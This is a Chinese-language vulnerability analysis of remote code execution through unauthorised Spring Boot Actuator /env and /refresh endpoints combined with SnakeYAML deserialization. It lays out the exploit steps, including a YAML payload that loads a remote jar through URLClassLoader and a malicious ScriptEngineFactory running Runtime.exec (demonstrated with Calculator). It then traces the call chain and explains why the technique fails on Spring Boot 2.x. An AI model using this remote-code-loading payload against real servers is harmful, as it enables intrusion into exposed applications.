###  利用过程
1、vps起个http服务，上面放yml配置文件yaml-payload.yml和yaml-payload.jar文件：
yaml-payload.yml内容如下：
    !!javax.script.ScriptEngineManager [
      !!java.net.URLClassLoader [[
        !!java.net.URL ["http://127.0.0.1:8087/yaml-payload.jar"]
      ]]
    ]
yaml-payload.jar参考：[https://github.com/artsploit/yaml-payload，主要内容在构造方法中：](https://github.com/artsploit/yaml-payload%EF%BC%8C%E4%B8%BB%E8%A6%81%E5%86%85%E5%AE%B9%E5%9C%A8%E6%9E%84%E9%80%A0%E6%96%B9%E6%B3%95%E4%B8%AD%EF%BC%9A)
    public AwesomeScriptEngineFactory() {
        try {
            Runtime.getRuntime().exec("/System/Applications/Calculator.app/Contents/MacOS/Calculator");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
2、利用actuator的/env
endpoint修改spring.cloud.bootstrap.location属性的值为vps上的yml配置文件的地址[http://127.0.0.1:8087/yaml-payload.yaml：](http://127.0.0.1:8087/yaml-payload.yaml%EF%BC%9A)
通过actuator的/refresh接口刷新配置，则成功执行payload：
## 漏洞分析
springboot actuator组件未授权访问时，其/env端点经过spring
cloud的扩展，可通过post请求设置env属性值，/refresh端点可以刷新配置；
当设置spring.cloud.bootstrap.location的值为外部的yaml文件地址时，通过refresh端点刷新时将会访问yaml文件地址并读取yaml文件内容：
  * http请求/refresh接口，将进入到刷新配置的入口 org.springframework.cloud.endpoint.RefreshEndpoint#refresh：
  * 其中spring.cloud.bootstrap.location的值 将在org.springframework.cloud.bootstrap.BootstrapApplicationListener#bootstrapServiceContext中
  * 进行处理：
  * 由于获取到spring.cloud.bootstrap.location的值为yaml后缀，将在org.springframework.boot.env.PropertySourcesLoader#load中调用到org.springframework.boot.env.YamlPropertySourceLoader#load进行加载yaml文件：
  * 最终在org.yaml.snakeyaml.Yaml#loadAll中进行读取yaml文件内容：
通过org.yaml.snakeyaml.Yaml#loadAll读取yaml文件内容，简单总结如下：
    Yaml yaml = new Yaml();
    Object url = yaml.load("!!javax.script.ScriptEngineManager [\n" +
            "  !!java.net.URLClassLoader [[\n" +
            "    !!java.net.URL [\"http://127.0.0.1:8087/yaml-payload.jar\"]\n" +
            "  ]]\n" +
            "]");
由于SnakeYAML支持!!+完整类名的方式指定要反序列化的类，并可以[arg1, arg2, ……]
的方式传递构造方法所需参数，则上述操作等价于执行如下内容：
    URL url = new URL("http://127.0.0.1:8087/yaml-payload.jar");
    URLClassLoader urlClassLoader = new URLClassLoader(new URL[]{url});
    new ScriptEngineManager(urlClassLoader);
而URLClassLoader继承自SecureClassLoader（继承自ClassLoader），支持从jar包、文件系统目录和远程http服务器中动态获取class文件以加载类（ClassLoader只能加载classpath下面的类）；
这里则将访问
，并通过javax.script.ScriptEngineManager#ScriptEngineManager进行处理：
下面就是ScriptEngineManager利用链的分析过程；
首先init()中调用initEngines()，使用SPI机制动态加载javax.script.ScriptEngineFactory的实现类，即通过getServiceLoader，去寻找yaml-payload.jar中META-INF/services目录下的名为javax.script.ScriptEngineFactory的文件，获取该文件内容并加载其中指定的类；
为了满足Java SPI机制（是JDK内置的一种服务提供发现机制）的约定，在yaml-payload.jar中的恶意类实现了ScriptEngineFactory，META-INF/services/目录下存在一个名为javax.script.ScriptEngineFactory，文件内容为完整恶意类名：
Java SPI机制可参考：
继续跟进，经过如下调用链：
最终在java.util.ServiceLoader.LazyIterator#nextService中利用Java反射机制获取yaml-payload.jar中的恶意类，并在newInstance时触发恶意类构造函数中的payload：
注意，这里forName的第二个参数initialize为false，有些博客描述为当true时则可触发恶意类构造函数中的payload；
其实，当forName第二个参数为true时仅会进行类初始化，从注释中也可看到：
而类的初始化并不会执行构造函数，但是会执行静态代码块，验证如下：
    public class TestClassForname {
        public static void main(String[] args) throws ClassNotFoundException {
            ClassLoader loader = TestClassForname.class.getClassLoader();
            System.out.println("\n=========initialize为false测试==========");
            Class.forName("com.ttestoo.snakeyaml.payload.Test", false, loader);
            System.out.println("\n=========initialize为true测试==========");
            Class.forName("com.ttestoo.snakeyaml.payload.Test", true, loader);
        }
    }
    class Test {
        static {
            System.out.print("静态代码块被调用。。。");
        }
        public Test() {
            System.out.print("无参构造函数被调用。。。");
        }
    }
当然，恶意类中的payload也可以放在静态代码块中，由于这里为false依旧在newInstance()时触发：
    public class AwesomeScriptEngineFactory implements ScriptEngineFactory {
        static  {
            try {
                Runtime.getRuntime().exec("/System/Applications/Calculator.app/Contents/MacOS/Calculator");
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
        ....
## SpringBoot 2.x利用的问题
上述分析过程在springboot 1.x环境下，8月16号刚好遇到实际业务环境springboot
2.x存在actuator未授权访问问题，且存在snakeyaml组件：
利用过程中env endpoints post请求正常：
但是请求refresh后并无任何动静，且响应内容为空（1.x请求refresh端点会响应“document”）：
这就是知识点未学透的结果！！！对于此利用方式，2.x能否成功rce呢？
搭建2.x的测试环境（和业务环境一致），如下：
    springboot 2.0.6.RELEASE
    springcloud 2.0.0.RELEASE
    org.yaml.snakeyaml 1.19
    注意2.x需手工配置开启env、refresh endpoints，这里为方便直接*：
    management.endpoints.web.exposure.include=*
在1.x利用分析过程中得知spring.cloud.bootstrap.location属性是在org.springframework.cloud.bootstrap.BootstrapApplicationListener#bootstrapServiceContext中获取，这里直接在此处下断点：
开启debug，记得在请求refresh前通过env设置spring.cloud.bootstrap.location属性（否则可能为空，影响判断）：
接下来请求refresh端点，可清晰看到此时configLocation为空，即并未获取到上步设置的spring.cloud.bootstrap.location属性：
此时environment参数中无任何spring.cloud.bootstrap.location属性相关的信息：
回看1.x环境中的environment，发现在propertySources的propertySourceList中包含一个name为manager，value为env
post请求设置的属性值：
可初步判断是在设置spring.cloud.bootstrap.location属性时出现了变更导致environment变量中无spring.cloud.bootstrap.location属性造成无法rce；
那么接下来就可以溯源environment变量如何生成的；根据执行到String configLocation =
environment.resolvePlaceholders(“${spring.cloud.bootstrap.location:}”);的调用链，可得知environment在org.springframework.cloud.context.refresh.ContextRefresher#refresh中定义并通过org.springframework.cloud.context.refresh.ContextRefresher#copyEnvironment函数进行赋值：
对比spring-cloud-context 1.2.0和spring-cloud-context
2.0.0的copyEnvironment函数，其中1.x中将input（来自this.context.getEnvironment()，包含post
env设置的spring.cloud.bootstrap.location属性）中propertySources的propertySourceList全部赋值给environment：
而在2.x中增加了一个for循环进行判断name是否在常量DEFAULT_PROPERTY_SOURCES中，只有在其中的才会执行capturedPropertySources.addLast操作：
跟进常量DEFAULT_PROPERTY_SOURCES，为String数组：[“commandLineArgs”,
“defaultProperties”]
由于我们通过post
env端点设置的spring.cloud.bootstrap.location属性值存放在name为manager中，所以这里并不会执行capturedPropertySources.addLast操作，也就无法添加到environment中，从而导致spring.cloud.bootstrap.location属性值在refresh时并未设置并刷新：
即上面所说的现象，org.springframework.cloud.bootstrap.BootstrapApplicationListener#bootstrapServiceContext中获取spring.cloud.bootstrap.location属性值时为空：
> 注意，这里补充下，根据“Actuator env说明”部分可知，refresh是在spring-cloud-> context中扩展的，所以此问题重点是spring-cloud-> context的变更导致，即上方org.springframework.cloud.context.refresh.ContextRefresher#copyEnvironment函数的不同。
## 巨人的肩膀
  * [exploiting-spring-boot-actuators](https://www.veracode.com/blog/research/exploiting-spring-boot-actuators)
  * [yaml-payload](https://github.com/artsploit/yaml-payload)
  * [exploit-spring-boot-actuator-spring-cloud-env-note](https://b1ngz.github.io/exploit-spring-boot-actuator-spring-cloud-env-note)
  * ……
最后，认知有限，烦请大佬指点。。。